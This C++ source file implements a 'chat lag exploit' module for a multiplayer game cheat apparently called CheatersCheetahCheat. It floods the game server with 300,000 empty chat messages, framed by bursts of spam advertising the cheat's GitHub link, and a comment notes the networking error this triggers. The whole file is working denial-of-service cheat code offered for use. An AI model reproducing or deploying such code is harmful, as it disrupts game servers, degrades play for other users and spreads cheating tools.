#include "chatlagexploit.h"

#include "../gamesdk.h"

void ChatLagExploit::Invoke() {
	auto localplayer = Game::PlayerInstance::get_LocalInstance();
	Game::DataStructs::SerializableTextChatMessage_o advertmsg { nullptr, "Lag exploit by CCC https://github.com/acuifex/CheatersCheetahCheat"_il2cpp, 1};
	for (int i = 0; i < 50; ++i) {
		Game::PlayerInstance::CmdSendChatToServer(localplayer, &advertmsg);
	}
	Game::DataStructs::SerializableTextChatMessage_o emptymsg { nullptr, ""_il2cpp, 1};
	for (int i = 0; i < 300000; ++i) {
		Game::PlayerInstance::CmdSendChatToServer(localplayer, &emptymsg);
	}
	for (int i = 0; i < 50; ++i) {
		Game::PlayerInstance::CmdSendChatToServer(localplayer, &advertmsg);
	}
	// even 100 more advert messages result in this error lol. i've chosen 300k at random.
	// src/steamnetworkingsockets/clientlib/steamnetworkingsockets_connections.cpp (2091) : Assertion Failed: Message size 524289 is too big.  Max is 524288
}
